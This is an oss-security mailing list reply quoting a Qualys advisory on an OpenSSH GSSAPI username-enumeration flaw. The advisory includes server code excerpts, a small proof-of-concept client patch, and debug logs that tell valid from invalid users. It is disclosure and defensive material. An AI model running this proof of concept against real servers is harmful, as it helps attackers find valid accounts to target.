  oss-security - Re: Another OpenSSH "user enumeration"            Products  Openwall GNU/*/Linux   server OS Linux Kernel Runtime Guard John the Ripper   password cracker  Free & Open Source for any platform in the cloud Pro for Linux Pro for macOS  Wordlists   for password cracking passwdqc   policy enforcement  Free & Open Source for Unix Pro for Windows (Active Directory)  yescrypt   KDF & password hashing yespower   Proof-of-Work (PoW) crypt_blowfish   password hashing phpass   ditto in PHP tcb   better password shadowing Pluggable Authentication Modules scanlogd   port scan detector popa3d   tiny POP3 daemon blists   web interface to mailing lists msulogin   single user mode login php_mt_seed   mt_rand() cracker  Services Publications  Articles Presentations  Resources  Mailing lists Community wiki Source code repositories (GitHub) Source code repositories (CVSweb) File archive & mirrors How to verify digital signatures OVE IDs  What's new         Follow @Openwall on Twitter for new release announcements and other news   [<prev] [next>] [<thread-prev] [day] [month] [year] [list]  Date: Tue, 28 Aug From: Marcus Meissner <meissner@...e.de> To: oss-security@...ts.openwall.com Subject: Re: Another OpenSSH "user enumeration"  Hi,  Mitre has assigned  Ciao, Marcus  On Mon, Aug 27, at Qualys Security Advisory wrote: > Hi all, >  > On August 24, we sent the following email to openssh@...nssh.com > and distros@...openwall.org. About the disclosure of this issue, Solar > Designer wrote "I'd be even happier with it being made public right away > if that's OK with both the OpenSSH team and Qualys", and Theo de Raadt > wrote "More than reporting to us, I urge you to publish it"; for a > detailed explanation, please refer to Damien Miller's post: >  > >  > We thank the OpenSSH developers and the members of > distros@...openwall.org for their constructive comments, suggestions, > and feedback. >  > ======================================================================== >  > While properly reviewing the now-famous OpenSSH commit > > we discovered another username-enumeration vulnerability in auth2-gss.c > (enabled by default on at least Fedora, CentOS, and Red Hat Enterprise > Linux). >  > This vulnerability affects OpenSSH versions from 5.9 (September 6, > to the recently released 7.8 (August 24, inclusive. It is quite > similar to (it is not a timing attack), but it is also > markedly different (code excerpts from OpenSSH >  >  61 static int >  62 userauth_gssapi(struct ssh *ssh) >  63 { > ... >         if (!authctxt->valid || authctxt->user == NULL) { >                 debug2("%s: disabled because of invalid user", __func__); >                 free(doid); >                 return (0); >         } >  >         if (GSS_ERROR(PRIVSEP(ssh_gssapi_server_ctx(&ctxt, &goid)))) { >                 if (ctxt != NULL) >                         ssh_gssapi_delete_ctx(&ctxt); >                 free(doid); >                 authctxt->server_caused_failure = 1; >                 return (0); >         } > ... >         if ((r = sshpkt_start(ssh, SSH2_MSG_USERAUTH_GSSAPI_RESPONSE)) != 0 || >             (r = sshpkt_put_string(ssh, doid, len)) != 0 || >             (r = sshpkt_send(ssh)) != 0) > ... >         authctxt->postponed = 1; >  >         return (0); > } >  > - If this first step of the GSSAPI authentication succeeds, then >   "postponed" is set to 1 (at line and the server sends a packet >   SSH2_MSG_USERAUTH_GSSAPI_RESPONSE to the attacker (at lines >   in this particular case, the user is necessarily valid (it exists). >  > - Otherwise "postponed" is not set, and userauth_gssapi() returns 0 at >   line or in both cases, the server's userauth_finish() sends a >   packet SSH2_MSG_USERAUTH_FAILURE to the attacker, who should therefore >   be unable to distinguish between a valid and invalid user. However, if >   the user is valid, then "server_caused_failure" is set (at line >   if the user is invalid, it is not set. Consequently, the behavior of >   userauth_finish() changes: >  > void > userauth_finish(struct ssh *ssh, int authenticated, const char *method, >     const char *submethod) > { > ... >                 if (!partial && !authctxt->server_caused_failure && >                     (authctxt->attempt > 1 || strcmp(method, "none") != 0)) >                         authctxt->failures++; >                 if (authctxt->failures >= options.max_authtries) { > ... >                         auth_maxtries_exceeded(authctxt); >                 } > ... >                 packet_start(SSH2_MSG_USERAUTH_FAILURE); >                 packet_put_cstring(methods); >                 packet_put_char(partial); >                 packet_send(); > ... > } >  >   . if the user is valid, then "server_caused_failure" is set, >     "failures" is not incremented, and the attacker can attempt the >     GSSAPI authentication indefinitely; >  >   . if the user is invalid, then "server_caused_failure" is not set, >     "failures" is incremented (at line and the server will >     disconnect the attacker (at line after max_authtries >     authentication attempts (6, by default). >  > Below is a very crude proof-of-concept (a patch for the client in > OpenSSH >  > ------------------------------------------------------------------------ >  > diff -pruN > --- > +++ > @@ @@ ssh_gssapi_check_mechanism(Gssctxt **ctx >   >  	ssh_gssapi_build_ctx(ctx); >  	ssh_gssapi_set_oid(*ctx, oid); > +	return 1; >  	major = ssh_gssapi_import_name(*ctx, host); >  	if (!GSS_ERROR(major)) { >  		major = ssh_gssapi_init_ctx(*ctx, 0, GSS_C_NO_BUFFER, &token,  > diff -pruN > --- > +++ > @@ @@ userauth_gssapi(Authctxt *authctxt) >  	ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_TOKEN, &input_gssapi_token); >  	ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_ERROR, &input_gssapi_error); >  	ssh_dispatch_set(ssh, SSH2_MSG_USERAUTH_GSSAPI_ERRTOK, &input_gssapi_errtok); > +	return 1; >   >  	mech++; /* Move along to next candidate */ >   > ------------------------------------------------------------------------ >  > For example, on Fedora, "adm" is a valid user, but "pocorgtfo" is not: >  > ------------------------------------------------------------------------ >  > ./ssh -v -F /etc/ssh/ssh_config -o PreferredAuthentications=gssapi-with-mic > ... > debug1: Authentications that can continue: publickey,gssapi-with-mic,password > debug1: Next authentication method: gssapi-with-mic > debug1: Authentications that can continue: publickey,gssapi-with-mic,password > debug1: Authentications that can continue: publickey,gssapi-with-mic,password > debug1: Authentications that can continue: publickey,gssapi-with-mic,password > debug1: Authentications that can continue: publickey,gssapi-with-mic,password > debug1: Authentications that can continue: publickey,gssapi-with-mic,password > debug1: Authentications that can continue: publickey,gssapi-with-mic,password > debug1: Authentications that can continue: publickey,gssapi-with-mic,password > debug1: Authentications that can continue: publickey,gssapi-with-mic,password > debug1: Authentications that can continue: publickey,gssapi-with-mic,password > ... >  > ./ssh -v -F /etc/ssh/ssh_config -o PreferredAuthentications=gssapi-with-mic > ... > debug1: Authentications that can continue: publickey,gssapi-with-mic,password > debug1: Next authentication method: gssapi-with-mic > debug1: Authentications that can continue: publickey,gssapi-with-mic,password > debug1: Authentications that can continue: publickey,gssapi-with-mic,password > debug1: Authentications that can continue: publickey,gssapi-with-mic,password > debug1: Authentications that can continue: publickey,gssapi-with-mic,password > debug1: Authentications that can continue: publickey,gssapi-with-mic,password > Received disconnect from port Too many authentication failures > Disconnected from port 22 >  > ------------------------------------------------------------------------ >  > We understand that the OpenSSH developers do not want to treat such a > username enumeration (or "oracle") as a vulnerability (although it is > quite useful in an attacker's toolbox), but how should we coordinate > this disclosure, then? OpenSSH developers, distros, please advise. >  > Thank you very much! With best regards, >  > --  > the Qualys Security Advisory team >   --  Marcus Meissner,SUSE LINUX GmbH; Maxfeldstrasse 5; Nuernberg; Zi. <meissner@...e.de>  Powered by blists - more mailing lists  Please check out the  Open Source Software Security Wiki, which is counterpart to this mailing list.  Confused about mailing lists and their use? Read about mailing lists on Wikipedia and check out these guidelines on proper formatting of your messages.      